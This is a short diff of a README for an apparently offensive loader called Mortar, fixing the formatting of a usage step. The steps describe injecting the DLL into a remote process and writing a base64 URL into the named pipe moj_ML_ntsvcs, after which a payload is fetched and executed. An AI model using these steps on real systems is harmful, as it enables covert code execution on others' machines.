@@ -62,7 +62,7 @@ currently supports early bird injection in combination with Named Pipes to recei
 ```
 1. inject Mortar DLL into remote process( DLL injection, Hijacking, sideloading).
 2. connect into the named pipe to supply your URL 
-   echo {BASE64 URL} > [\\.\pipe\](file:///./pipe/)moj_ML_ntsvcs 
+   echo {BASE64 URL} > [\\.\pipe\moj_ML_ntsvcs 
 3. payload will be executed once valid value has been recieved. 
 ```
 
